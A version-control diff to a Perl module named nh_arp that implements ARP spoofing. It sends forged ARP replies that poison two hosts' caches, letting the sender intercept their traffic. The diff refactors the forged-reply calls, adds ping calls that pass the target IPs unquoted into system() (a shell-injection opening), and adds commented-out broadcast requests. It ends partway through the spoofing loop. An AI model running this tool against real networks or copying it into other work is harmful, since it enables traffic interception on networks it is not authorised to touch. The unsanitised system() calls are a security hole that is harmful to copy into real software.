@@ -1,11 +1,16 @@
 package net::arp::nh_arp;
 use Net::ARP;
+use net::ip::nh_ip;
 require Exporter;
 
 @ISA = qw(Exporter);
 @EXPORT = qw(
                 nh_arp_spoof 
              );
+
+my $nh_arp_request = "request";           
+my $nh_arp_reply = "reply";           
+my $nh_arp_request_broadcast = "FF:FF:FF:FF:FF:FF";
 
 sub nh_arp_send_reply {
     my $if = shift(@_);
@@ -20,14 +25,14 @@ sub nh_arp_send_reply {
         $dip2,          # Destination IP
         $smac,                 # Source MAC
         $dmac2,  # Destinaton MAC
-        'reply');             # ARP operation
+        $nh_arp_reply);             # ARP operation
 
     Net::ARP::send_packet($if,
         $dip2,
         $dip1,
         $smac, 
         $dmac1,
-        'reply'); 
+        $nh_arp_reply); 
 }            
 
 sub nh_arp_spoof {
@@ -41,6 +46,22 @@ sub nh_arp_spoof {
     my $dmac2;
 
     $smac = Net::ARP::get_mac($if);
+    $local_ip = &nh_ip_get($if); 
+    system("ping -c 1 $dip1 >/dev/null");
+    system("ping -c 1 $dip2 >/dev/null");
+#    Net::ARP::send_packet($if,
+#        $local_ip,
+#        $dip1,
+#        $smac, 
+#        $nh_arp_request_broadcast,
+#        $nh_arp_request); 
+#    Net::ARP::send_packet($if,
+#        $local_ip,
+#        $dip2,
+#        $smac, 
+#        $nh_arp_request_broadcast,
+#        $nh_arp_request); 
+#    sleep(1);
     while (1) {
         $dmac1 = Net::ARP::arp_lookup($if, $dip1);
         if ($dmac1 eq "unknown") {
